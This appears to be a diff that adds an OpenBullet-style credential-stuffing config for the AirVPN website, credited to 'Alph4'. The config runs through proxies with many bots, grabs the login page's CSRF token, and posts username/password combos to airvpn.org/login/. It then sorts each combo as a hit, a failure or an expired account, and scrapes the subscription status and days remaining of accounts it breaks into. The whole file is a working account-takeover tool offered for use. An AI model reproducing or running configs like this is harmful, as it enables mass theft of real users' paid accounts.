@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "airvpn",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-20T04:08:33.5257241-07:00",
+  "AdditionalInfo": "",
+  "Author": "Alph4",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://airvpn.org/" AcceptEncoding=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "block.opendns" 
+
+PARSE "<SOURCE>" LR "csrfKey\" value=\"" "\"" -> VAR "csrf" 
+
+REQUEST POST "https://airvpn.org/login/" 
+  CONTENT "csrfKey=<csrf>&auth=<USER>&password=<PASS>&remember_me=1&_processLogin=usernamepassword&_processLogin=usernamepassword" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://airvpn.org" 
+  HEADER "referer: https://airvpn.org/login/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The username or password was incorrect" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "member_id" 
+    KEY "signout\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Member</strong></span> access<" 
+    KEY "access - expired" 
+
+PARSE "<SOURCE>" REGEX "air_topbar_info_green'><strong>([^\"]*)</strong></span> access - expire in <strong>([^\"]*)</strong> days</a>" "Is [1], Expire in [2] days" -> CAP "Subscription" 
+
